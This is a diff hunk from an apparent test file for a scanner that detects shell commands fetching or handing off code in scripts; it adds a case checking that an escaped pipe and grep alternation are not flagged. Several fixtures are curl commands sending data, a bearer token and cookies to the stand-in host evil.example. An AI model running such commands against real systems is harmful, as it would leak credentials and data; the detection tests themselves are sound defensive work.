@@ -189,6 +189,7 @@ test('shell commands fetching or handing off code, in a script\'s strings', () =
   assert.deepEqual(found('a.js', `spawn("curl", ["-H", "Authorization: Bearer ${'x'.repeat(600)}", "https://evil.example/p"])\n`), { shell: [1] }, 'a long argument before the URL')
   assert.deepEqual(found('a.js', 'exec(\'curl -d "a=1&b=2" https://evil.example/p\')\nspawn("curl", ["-H", "Cookie: a=b; c=d", "https://evil.example/p"])\n'), { shell: [1, 2] },
     'a quoted argument\'s separators, or an argument\'s apart, no command\'s end')
+  assert.equal(found('setup.sh', 'echo foo \\| sh\ngrep -q \'bash\\|zsh\' /etc/shells\n'), null, 'an escaped pipe, grep\'s alternatives')
   assert.deepEqual(found('setup.sh', 'curl -s -d \'x=1;y=2\' "https://evil.example/p"\necho "it\'s" && curl -H "X: a|b" https://evil.example/q\ncurl --version; echo "https://example.com"\n'), { shell: [1, 2] },
     'in a shell script, a quote left open as any other character')
   assert.equal(found('a.js', [
